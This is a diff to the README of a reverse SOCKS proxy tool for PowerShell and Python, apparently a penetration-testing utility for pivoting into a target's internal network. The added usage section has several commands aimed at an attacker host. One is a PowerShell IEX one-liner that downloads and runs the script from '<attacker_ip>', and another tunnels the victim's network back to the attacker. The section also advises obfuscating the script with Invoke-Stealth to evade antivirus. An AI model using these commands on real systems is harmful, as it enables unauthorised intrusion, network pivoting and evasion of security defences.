@@ -5,58 +5,32 @@ The local proxy is a simple Socks 4/5 proxy.
 
 The reverse proxy creates a tcp tunnel by initiating outbond SSL connections that can go through the system's proxy. The tunnel can then be used as a socks proxy on the remote host to pivot into the local host's network.
 
-# Examples
+Modified from [Invoke-SocksProxy](https://github.com/p3nt4/Invoke-SocksProxy) due to deprecation issues with SSL, etc.
 
-## Local 
+# Usage
 
-Create a Socks 4/5 proxy on port 1080:
-```
-Import-Module .\Invoke-SocksProxy.psm1
-Invoke-SocksProxy -bindPort 1080
-```
-
-Increase the maximum number of threads from 200 to 400
-```
-Import-Module .\Invoke-SocksProxy.psm1
-Invoke-SocksProxy -threads 400
-```
-## Reverse
-
-Create a "reverse" Socks 4/5 proxy on port 1080 of a remote host:
-```
-# On the remote host: 
-# Generate a private key and self signed cert
-openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout private.key -out cert.pem
-
-# Get the certificate fingerprint to verify it:
-openssl x509 -in cert.pem -noout -sha1 -fingerprint | cut -d "=" -f 2 | tr -d ":"
-
-# Start the handler
-python3 ReverseSocksProxyHandler.py 443 1080 ./cert.pem ./private.key
-
-# On the local host:
-Import-Module .\Invoke-SocksProxy.psm1
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 
-
-# Go through the system proxy:
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -useSystemProxy
-
-# Validate certificate
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -certFingerprint '93061FDB30D69A435ACF96430744C5CC5473D44E'
-
-# Give up after a number of failed connections to the handler:
-Invoke-ReverseSocksProxy -remotePort 443 -remoteHost 192.168.49.130 -maxRetries 10
-
+## Server
+Create server SSL certificates
+```sh
+openssl req -x509 -newkey rsa:2048 -nodes -keyout /tmp/private.key -out /tmp/cert.pem -subj "/CN=whatever.com" -days 9999 &>/dev/null
+fingerprint=$(openssl x509 -in /tmp/cert.pem -noout -sha1 -fingerprint | cut -d "=" -f 2 | tr -d ":")
+echo "Use $fingerprint for <cert_fingerprint>"
 ```
 
-Credit for the System Proxy trick: https://github.com/Arno0x/PowerShellScripts/blob/master/proxyTunnel.ps1
+Run the socks proxy server via python3 on port 1080:
+```sh
+python3 SocksProxyServer.py <attacker_port> 1080 /tmp/cert.pem /tmp/private.key
+```
 
-
-# Limitations
-- This is only a subset of the Socks 4 and 5 protocols: It does not support authentication, It does not support UDP or bind requests.
-- When the Socks Proxy runs out of available threads, new connections cannot be established until a thread is freed.
-- New features will be implemented in the future. PR are welcome.
+## Client
+Add this to the end of `Invoke-SocksProxy.ps1`
+```sh
+Invoke-ReverseSocksProxy -remotePort <attacker_port> -remoteHost <attacker_ip> -maxRetries 3 -certFingerprint <cert_fingerprint>
+```
+```sh
+powershell IEX(New-Object Net.WebClient).DownloadString('http://<attacker_ip>/Invoke-SocksProxy.ps1')
+```
+For AV evasion, you can obfuscate easily with [Invoke-Stealth](https://github.com/JoelGMSec/Invoke-Stealth)
 
 # Disclaimer
 This project is intended for security researchers and penetration testers and should only be used with the approval of system owners.
-
